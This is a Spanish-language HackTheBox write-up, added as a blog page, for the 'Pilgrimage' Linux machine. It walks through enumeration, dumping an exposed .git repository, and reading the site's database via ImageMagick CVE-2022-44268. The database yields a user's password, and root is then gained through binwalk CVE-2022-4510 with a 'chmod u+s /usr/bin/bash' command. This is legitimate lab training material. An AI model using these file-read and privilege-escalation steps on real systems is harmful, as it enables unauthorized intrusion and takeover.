@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Pilgrimage Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina Linux de nivel Easy de la plataforma HackTheBox">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Pilgrimage Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina Linux de nivel Easy de la plataforma HackTheBox">
+
+<meta property="og:url" content="https://celero0.github.io/posts/pilgrimage/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Pilgrimage Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina Linux de nivel Easy de la plataforma HackTheBox">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-29T23:36:29+00:00">
+    <meta property="article:modified_time" content="2025-11-29T23:36:29+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/pilgrimage/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/pilgrimage/">
+              Pilgrimage Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-11-29T23:36:29Z">
+                November 29, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Linux #Magick #Binwalk #github</li>
+</ul>
+<hr>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.219 -oG allPorts
+</span></span></code></pre></div><p>En el escaneo vemos el dominio <code>pilgrimage.htb</code></p>
+<img src="/images/Pasted image 20251103181357.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Procederemos a agregarlo a nuestro <code>/etc/hosts</code></p>
+<img src="/images/Pasted image 20251103181502.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-http-puerto-80">
+  Enumeración HTTP puerto 80
+  <a class="heading-link" href="#enumeraci%c3%b3n-http-puerto-80">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Viendo la página web, vemos que podemos subir archivos, al parecer imagenes y que estas se editan</p>
+<img src="/images/Pasted image 20251103181756.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Nos registraremos con las credenciales <code>rkx:rkx</code> y al loguearnos nos lleva al <code>dashboard.php</code></p>
+<img src="/images/Pasted image 20251103181902.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Revisando la web, no encontramos nada interesante, por tanto seguimos enumerando directorios con <code>fuzz</code> con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://pilgrimage.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#a5d6ff">100</span> -fs <span style="color:#a5d6ff">7621</span>
+</span></span></code></pre></div><h1 id="enumeración-github">
+  Enumeración Github
+  <a class="heading-link" href="#enumeraci%c3%b3n-github">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>#github</p>
+<p>Y encontramos el directorio <code>.git</code> de github</p>
+<img src="/images/Pasted image 20251103214438.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para enumerar github descargaremos el siguiente recurso de github</p>
+<p><code>https://github.com/arthaud/git-dumper</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/arthaud/git-dumper
+</span></span></code></pre></div><h2 id="entorno-virtual-en-python">
+  Entorno virtual en python
+  <a class="heading-link" href="#entorno-virtual-en-python">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Se crea un entorno virtual para no instalar librerías innecesarias que pueden generar conflictos en nuestro sistema</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m venv .venv
+</span></span><span style="display:flex;"><span>source .venv/bin/activate
+</span></span><span style="display:flex;"><span>pip install -r requirements.txt
+</span></span></code></pre></div><p>Usamos git-dumper de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 git_dumper.py http://pilgrimage.htb/.git git
+</span></span></code></pre></div><p>para salir del entorno virtual usar</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>deactivate
+</span></span></code></pre></div><p>Haciendo un tree al recurso que descargamos con git-dumper tenemos lo siguiente</p>
+<img src="/images/Pasted image 20251103221052.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Vemos que se está usando <code>magick</code> para hacer la transformación de la imagen, con la bandera <code>-version</code> vemos la versión</p>
+<img src="/images/Pasted image 20251103221203.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Además si vemos el archivo <code>login.php</code>, nos muestra la ruta que alberga la base de datos sqlite, en este caso <code>/var/db/pilgrimage</code></p>
+<img src="/images/Pasted image 20251103222027.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="explotando-imagemagick-710-49">
+  Explotando ImageMagick 7.1.0-49
+  <a class="heading-link" href="#explotando-imagemagick-710-49">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Buscando por vulnerabilidades a la versión de magick encontramos un information disclosure.</p>
+<p>La vulnerabilidad consiste en insertar una ruta en los metadatos de una imagen con extensión .png, luego al subir la imagen y tratarse con <code>ImageMagick 7.1.0-49</code> podemos descargar el archivo tratado, y al usar <code>exiv2</code> leer la ruta en hexadecimal.</p>
+<img src="/images/Pasted image 20251103221500.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Buscando por un PoC para la CVE-2022-44268, encontramos el siguiente PoC en github</p>
+<img src="/images/Pasted image 20251103221543.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="dependencias">
+  Dependencias
+  <a class="heading-link" href="#dependencias">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Necesitamos tener <code>pngcrush</code>, <code>exiftool</code> y <code>exiv2</code></p>
+<h2 id="creación-de-png-malicioso">
+  Creación de Png Malicioso
+  <a class="heading-link" href="#creaci%c3%b3n-de-png-malicioso">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Primeramente descargar un archivo .png cualquiera</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://w7.pngwing.com/pngs/151/483/png-transparent-brown-tabby-cat-cat-dog-kitten-pet-sitting-the-waving-cat-animals-cat-like-mammal-pet-thumbnail.png
+</span></span></code></pre></div><p>Renombramos el archivo por comodidad a <code>gato.png</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mv png-transparent-brown-tabby-cat-cat-dog-kitten-pet-sitting-the-waving-cat-animals-cat-like-mammal-pet-thumbnail.png gato.png
+</span></span></code></pre></div><p>Creamos el archivo <code>pngout.png</code> malicioso</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pngcrush -text a <span style="color:#a5d6ff">&#34;profile&#34;</span> <span style="color:#a5d6ff">&#34;/var/db/pilgrimage&#34;</span> gato.png
+</span></span></code></pre></div><h2 id="verificamos-el-archivo-malicioso">
+  Verificamos el archivo malicioso
+  <a class="heading-link" href="#verificamos-el-archivo-malicioso">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para verificar si creamos bien el archivo malicioso usamos</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exiv2 -pS pngout.png
+</span></span></code></pre></div><p>y tenemos lo siguiente</p>
+<img src="/images/Pasted image 20251103222516.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="subimos-el-archivo-malicioso-a-la-web">
+  Subimos el archivo malicioso a la web
+  <a class="heading-link" href="#subimos-el-archivo-malicioso-a-la-web">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<img src="/images/Pasted image 20251103222553.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Descargamos la imagen una vez convertida</p>
+<img src="/images/Pasted image 20251103222612.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="leemos-el-contenido">
+  Leemos el contenido
+  <a class="heading-link" href="#leemos-el-contenido">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para leer el contenido usamos el siguiente comando, recordar que el output es en hexadecimal</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>identify -verbose 69095618b889b.png
+</span></span></code></pre></div><p>El contenido que nos muestra es bastante largo, ya que es una base de datos</p>
+<img src="/images/Pasted image 20251103222801.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>A nosotros lo que nos interesa es el contenido que está en <code>Raw profile type:</code>, por tanto filtraremos por la primera línea completa de la siguiente forma:</p>
+<img src="/images/Pasted image 20251103222911.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Luego para ver las demás lineas de abajo tenemos la flag <code>-A [número]</code></p>
+<p>con -A 570 tenemos lo siguiente</p>
+<img src="/images/Pasted image 20251103223031.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y con -A 569 muestra lo siguiente</p>
+<img src="/images/Pasted image 20251103223056.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto utilizaremos -A 569 para tomar todo el contenido</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>identify -verbose 69095618b889b.png | grep -A <span style="color:#a5d6ff">569</span> <span style="color:#a5d6ff">&#34;53514c69&#34;</span> &gt; hex.txt
+</span></span></code></pre></div><h2 id="transformar-el-contenido">
+  Transformar el contenido
+  <a class="heading-link" href="#transformar-el-contenido">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para transformar desde hexadecimal a texto legible usaremos <code>xxd</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xxd -r -p hex.txt &gt; database.db
+</span></span></code></pre></div><p>Teniendo lo siguiente</p>
+<img src="/images/Pasted image 20251103223349.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="extrayendo-credenciales-desde-database">
+  Extrayendo credenciales desde database
+  <a class="heading-link" href="#extrayendo-credenciales-desde-database">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Teniendo la base de datos que obtuvimos gracias a la vulnerabilidad la procedemos a leer con <code>sqlite3</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlite3 database.db
+</span></span><span style="display:flex;"><span>.tables
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">select</span> * from users;
+</span></span></code></pre></div><p>y obtenemos las siguientes credenciales: <code>emily|abigchonkyboi123</code></p>
+<img src="/images/Pasted image 20251103223558.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Nos conectamos por <code>ssh</code> con las credenciales obtenidas, y leemos la flag de <code>user.txt</code></p>
+<img src="/images/Pasted image 20251103223700.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Buscando por los procesos que se ejecutan en la máquina víctima con <code>ps -aux</code> encontramos el siguiente script <code>/usr/sbin/malwarescan.sh</code> que lo ejecuta root</p>
+<img src="/images/Pasted image 20251103230938.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Viendo el script en cuestión tenemos que ejecuta <code>inotifywait</code> en la ruta <code>/var/www/pilgrimage.htb/shrunk</code> y luego utiliza <code>binwalk</code></p>
+<img src="/images/Pasted image 20251103231027.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Buscando vulnerabilidades de las herramientas que se utilizan encontramos la siguiente de <code>binwalk</code></p>
+<img src="/images/Pasted image 20251103231235.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Buscando específicamente por el <code>CVE-2022-4510</code> encontramos el siguiente script en github <code>https://github.com/adhikara13/CVE-2022-4510-WalkingPath</code></p>
+<img src="/images/Pasted image 20251103231330.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="explotar-vulnerabilidad">
+  Explotar vulnerabilidad
+  <a class="heading-link" href="#explotar-vulnerabilidad">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para explotar la vulnerabilidad debemos pasar el script descargado y una imagen png a la máquina víctima</p>
+<p>Una vez descargadas las almacenamos en la carpeta que está analizando binwalk, en este caso <code>/var/www/pilgrimage.htb/shrunk</code></p>
+<img src="/images/Pasted image 20251103231508.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora corremos el script de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 walkingpath.py command --command <span style="color:#a5d6ff">&#34;chmod u+s /usr/bin/bash&#34;</span> gato.png
+</span></span></code></pre></div><p>Y lo que hará es dar permiso SUUID a la bash</p>
+<img src="/images/Pasted image 20251103231616.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora con <code>bash -p</code> accedemos a los privilegios de root y podemos leer la flag de <code>root.txt</code></p>
+<img src="/images/Pasted image 20251103231659.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
